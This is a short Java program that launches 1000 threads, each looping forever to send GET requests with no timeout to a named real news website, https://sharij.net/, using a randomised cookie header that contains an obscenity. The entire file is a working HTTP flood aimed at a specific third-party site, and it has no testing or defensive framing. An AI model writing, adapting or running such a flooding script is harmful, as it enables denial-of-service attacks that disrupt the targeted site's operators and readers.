import com.mashape.unirest.http.HttpResponse;
import com.mashape.unirest.http.Unirest;
import com.mashape.unirest.http.exceptions.UnirestException;

public class HeyBabe implements Runnable {

    public static void main(String[] args) throws Exception {
        extracted();
    }

    private static void extracted() {
        for (int i = 0; i < 1000; i++) {
            final HeyBabe heyBabe = new HeyBabe();
            final Thread thread = new Thread(heyBabe);

            thread.start();
        }
    }

    public static void hey() throws UnirestException {
        double v = Math.random() * 49 + 1;
        Unirest.setTimeouts(0, 0);
        HttpResponse<String> response = Unirest.get("https://sharij.net/")
                .header("Cookie", "pizda " + v)
                .asString();
    }

    public static void loop() throws UnirestException {
        while (true) {
            hey();
            System.out.println("+");
        }
    }

    @Override
    public void run() {
        try {
            loop();
        } catch (UnirestException e) {
            e.printStackTrace();
        }
    }
}
